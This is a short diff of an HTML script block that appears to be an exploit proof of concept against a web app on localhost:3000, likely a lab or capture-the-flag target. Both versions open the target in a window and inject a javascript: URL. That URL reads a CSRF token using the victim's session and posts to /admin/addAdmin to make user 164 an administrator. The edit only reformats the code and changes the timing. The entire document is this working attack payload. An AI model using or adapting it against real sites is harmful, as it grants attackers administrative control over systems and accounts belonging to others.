@@ -1,17 +1,17 @@
 <script>
-const w = window.open('http://localhost:3000/', 'x');
-setTimeout(() => {
-  try {
-    w.location = `javascript:
-      fetch('/csrf-token',{credentials:'include'})
-        .then(r=>r.json())
-        .then(t=>fetch('/admin/addAdmin',{
-          method:'POST',
-          headers:{'content-type':'application/json','CSRF-Token':t.csrfToken},
-          credentials:'include',
-          body:JSON.stringify({userId:164})
-        }))
-    `;
-  } catch(e) {}
-}, 1200);
+  const w = window.open('http://localhost:3000/', '_blank');
+  setTimeout(() => {
+    try {
+      w.location = `javascript:
+        fetch('/csrf-token',{credentials:'include'})
+          .then(r=>r.json())
+          .then(t=>fetch('/admin/addAdmin',{
+            method:'POST',
+            headers:{'content-type':'application/json','CSRF-Token':t.csrfToken},
+            credentials:'include',
+            body:JSON.stringify({userId: 164})
+          }))
+      `;
+    } catch(e) {}
+  }, 1000);
 </script>
